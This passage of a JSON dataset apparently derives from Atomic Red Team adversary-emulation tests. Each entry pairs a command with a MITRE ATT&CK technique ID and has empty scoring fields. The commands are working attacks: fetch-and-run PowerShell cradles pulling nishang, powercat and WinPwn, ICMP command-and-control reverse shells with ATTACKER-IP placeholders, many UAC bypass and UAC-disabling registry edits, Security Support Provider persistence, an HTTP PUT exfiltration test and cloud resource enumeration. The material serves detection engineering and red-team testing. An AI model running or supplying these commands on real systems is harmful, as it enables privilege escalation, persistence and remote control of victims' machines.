        "Command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa -Name 'Security Packages' -Value $newvalue\n",
        "Description": "Add a value to a Windows registry Security Support Provider pointing to a payload .dll which will normally need to be copied in the system32 folder.\nA common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.005",
        "Shell": "powershell"
    },
    {
        "ID": 1380,
        "Command": "$oldvalue = $(Get-ItemProperty HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');\nSet-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\" -Name 'Security Packages old' -Value \"$oldvalue\";\n$newvalue = \"AtomicTest.dll\";\nSet-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig -Name 'Security Packages' -Value $newvalue\n",
        "Description": "Add a value to a Windows registry SSP key, simulating an adversarial modification of those keys.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.005",
        "Shell": "powershell"
    },
    {
        "ID": 1381,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:%TEMP%\\T1010.exe \"PathToAtomicsFolder\\T1010\\src\\T1010.cs\"\n%TEMP%\\T1010.exe\n",
        "Description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1010",
        "Shell": "command_prompt"
    },
    {
        "ID": 1382,
        "Command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress 127.0.0.1\n",
        "Description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1095",
        "Shell": "powershell"
    },
    {
        "ID": 1383,
        "Command": "cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe\" 127.0.0.1 80\n",
        "Description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1095",
        "Shell": "powershell"
    },
    {
        "ID": 1384,
        "Command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c 127.0.0.1 -p 80\n",
        "Description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1095",
        "Shell": "powershell"
    },
    {
        "ID": 1385,
        "Command": "1. Run the following command on both the attacker and victim machines to download the required binaries.\n\n\\tmkdir -p /tmp/icmpdoor && wget -P /tmp/icmpdoor https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmp-cnc https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmpdoor && chmod +x /tmp/icmpdoor/icmp-cnc /tmp/icmpdoor/icmpdoor && echo 'export PATH=$PATH:/tmp/icmpdoor' >> ~/.bashrc && source ~/.bashrc\n\n2. Start the C2 server on the attacker system to listen for incoming connections.\n\n\\ticmp-cnc --interface <Network Interface> --destination_ip <VICTIM-IP>\n\n3. Run the client on the victim machine.\n\n\\ticmpdoor --interface <Network Interface> --destination_ip <ATTACKER-IP>\n  \n4. Cleanup Command: Remove the icmpdoor directory.\n\n\\trm -rf /tmp/icmpdoor\n",
        "Description": "ICMP C2 (Command and Control) utilizes the Internet Control Message Protocol (ICMP), traditionally used for network diagnostics, as a covert communication channel for attackers. By using ICMP, adversaries can send commands, exfiltrate data, or maintain access to compromised systems without triggering network detection systems.\nThis method allows attackers to communicate and control compromised devices while remaining undetected.\n\nFor more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)\n\n**Important Notes:**\n- Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).\n- Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].\n- Root access is required.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1095",
        "Shell": "manual"
    },
    {
        "ID": 1386,
        "Command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\ncmd.exe /c eventvwr.msc\n",
        "Description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1387,
        "Command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
        "Description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1388,
        "Command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
        "Description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1389,
        "Command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
        "Description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1390,
        "Command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n",
        "Description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1391,
        "Command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
        "Description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1392,
        "Command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n",
        "Description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1393,
        "Command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n",
        "Description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1394,
        "Command": "\"PathToAtomicsFolder\\T1548.002\\src\\T1548.002.bat\"\n",
        "Description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1395,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1396,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1397,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1398,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1399,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1400,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1401,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1402,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe\"\n",
        "Description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1403,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic",
        "Description": "UAC bypass using Magic technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1404,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
        "Description": "UAC bypass using ccmstp technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1405,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nUACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup",
        "Description": "UAC bypass using DiskCleanup technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1406,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')",
        "Description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1407,
        "Command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin\nSet-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force",
        "Description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1408,
        "Command": "New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null\nNew-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
        "Description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1409,
        "Command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force",
        "Description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "powershell"
    },
    {
        "ID": 1410,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Security Center\" /v UACDisableNotify /t REG_DWORD /d 1 /f\n",
        "Description": "This atomic regarding UACDisableNotify pertains to the notification behavior of UAC. UAC is a critical security feature in Windows that prevents unauthorized changes to the operating system. It prompts the user for permission or an administrator password before allowing actions that could affect the system's operation or change settings that affect other users. The BlotchyQuasar RAT defense evasion activities that the adversary to disable UAC notifications makes it easier for malware and malicious software to execute with elevated privileges. [Article](https://securityintelligence.com/x-force/x-force-hive0129-targeting-financial-institutions-latam-banking-trojan/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1411,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n",
        "Description": "This atomic regarding setting ConsentPromptBehaviorAdmin to 0 configures the UAC so that it does not prompt for consent or credentials when actions requiring elevated privileges are performed by users in the administrators group. This means that any operation that would normally trigger a UAC prompt will proceed automatically without user interaction.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1412,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\.pwn\\Shell\\Open\\command\" /ve /d \"C:\\Windows\\System32\\calc.exe\" /f\n\nreg add \"HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\CurVer\" /ve /d \".pwn\" /f\n\necho Triggering fodhelper.exe for potential privilege escalation...\nstart fodhelper.exe\n",
        "Description": "This atomic designed to simulate the UAC bypassed made by ValleyRAT by adding customized ProgIDs registry entry.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1548.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1413,
        "Command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null",
        "Description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036",
        "Shell": "powershell"
    },
    {
        "ID": 1414,
        "Command": "Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null",
        "Description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036",
        "Shell": "powershell"
    },
    {
        "ID": 1415,
        "Command": "$fileName = \"C:\\temp\\T1020_exfilFile.txt\"\n$url = \"https://google.com\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
        "Description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1020",
        "Shell": "powershell"
    },
    {
        "ID": 1416,
        "Command": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"C:\\temp\\T1020__FTP_sample.txt\" -Value $sampleData\n$ftpUrl = \"ftp://example.com\"\n$creds = Get-Credential -Credential \"[user:password]\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"C:\\temp\\T1020__FTP_sample.txt\" -Credential $creds\n",
        "Description": "Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1020",
        "Shell": "powershell"
    },
    {
        "ID": 1417,
        "Command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-AzDomainInfo.ps1\"\n$Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\", $Password\nConnect-AzAccount -Credential $Credential | out-null\nGet-AzDomainInfo -folder $env:temp\\T1526Test1 -subscription \"\" -verbose\n",
        "Description": "Upon successful execution, this test will enumerate all resources that are contained within a valid Azure subscription. \nThe resources enumerated will display on screen, as well as several csv files and folders will be output to a specified directory, listing what resources were discovered by the script. \nSee https://dev.to/cheahengsoon/enumerating-subscription-information-with-microburst-35a1\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1526",
        "Shell": "powershell"
    },
    {
        "ID": 1418,
        "Command": "Import-Module \"PathToAtomicsFolder\\T1526\\src\\AWSDiscovery.ps1\"\n$access_key = \"\"\n$secret_key = \"\"\n$session_token = \"\"\n$aws_profile = \"\"\n$regions = \"us-east-1,us-east-2,us-west-1,us-west-2\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile\nGet-AWSDiscoveryData -Regions $regions -OutputDirectory \"$env:TMPDIR/aws_discovery\"\nRemove-BlankFiles -OutputDirectory \"$env:TMPDIR/aws_discovery\"\n",
        "Description": "Upon successful execution, this test will enumerate common resources that are contained within a valid AWS account.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1526",
        "Shell": "powershell"
    },
    {
        "ID": 1419,
        "Command": "Import-Module \"PathToAtomicsFolder\\T1526\\src\\AzureDiscovery.ps1\"\n$client_id = \"\"\n$client_secret = \"\"\n$tenant_id = \"\"\n$environment = \"AzureCloud\"\nSet-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment\nGet-AzureDiscoveryData -OutputDirectory \"$env:TMPDIR/azure_discovery\" -Environment $environment\nRemove-BlankFiles -OutputDirectory \"$env:TMPDIR/azure_discovery\"\n",
        "Description": "Upon successful execution, this test will enumerate common resources that are contained within a valid Azure subscription.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1526",
        "Shell": "powershell"
    },
    {
        "ID": 1420,
        "Command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi;\ncat /etc/group\n",
        "Description": "Permission Groups Discovery\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.001",
        "Shell": "sh"
    },
    {
        "ID": 1421,
        "Command": "net localgroup\nnet localgroup \"Administrators\"\n",
